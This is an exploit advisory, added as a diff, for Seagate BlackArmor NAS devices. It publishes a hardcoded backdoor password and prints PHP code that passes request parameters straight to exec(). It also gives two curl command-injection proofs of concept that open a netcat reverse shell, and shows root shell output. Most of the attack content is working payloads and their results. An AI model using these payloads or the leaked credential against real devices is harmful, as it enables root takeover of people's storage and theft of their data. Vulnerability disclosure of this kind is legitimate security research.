@@ -1,0 +1,50 @@
+# Exploit Title: Seagate BlackArmor NAS Multiple Vulnerabilities
+# Date: 2/17/14
+# Exploit Author: Shayan Sadigh (twitter.com/r1pplex) | <ienjoy.ripples@gmail.com>
+# Vendor Homepage: http://www.seagate.com/external-hard-drives/network-storage/
+# Version: All BlackArmor NAS devices..
+# Tested on: Linux
+# CVE : N/A
+
+1. some sort of backdoor user (hardcoded credentials) in backupmgt/pre_connect_check.php
+
+$password = '!~@#$EW#$$%FREDESWWSED';
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+2. remote [root] code execution, this software is riddled with many many bugs, including tons of rce..
+
+examples: localhost/backupmgt/localJob.php
+
+Vulnerable code:
+
+$session = $_GET["session"];
+$tempsrc = exec("cat $immedLog | grep $session | cut -d '".Chr(002)."' -f 3");
+$des = exec("cat $immedLog | grep $session | cut -d '".Chr(002)."' -f 4");
+
+PoC:  curl "localhost/backupmgt/localJob.php?session=fail;nc -e 127.0.0.1 99;"
+-------------------------
+listening on [any] 99 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 57157
+id
+uid=0(root) gid=0(root)
+
+another example: localhost/backupmgmt/pre_connect_check.php
+
+Vulnerable code:
+
+$ipString = $_GET["server_ip"];
+$auth_name = $_GET["auth_name"];
+$password = $_GET["auth_pass"];
+$alias_name = $_GET["alias_name"];
+$dryString ="rsync -rnP --password-file=temp.pas"." --log-file=pre.log --contimeout=5 /usr/sbin ".$auth_name."@".$ipString."::".$alias_name;
+$result =@exec ($dryString);	 // produce temp pre log
+
+PoC:  curl "localhost/backupmgt/pre_connect_check.php?auth_name=fail;nc -e 127.0.0.1 99;"
+-------------------------
+listening on [any] 99 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 52348
+id
+uid=0(root) gid=0(root)
+
+There's ton of more bugs in BlackArmor NAS software, there have been other releases noting other bugs (killProcesses.php RCE), Seagate has decided to ignore any messages regarding these..claiming they are only working on newer products now.
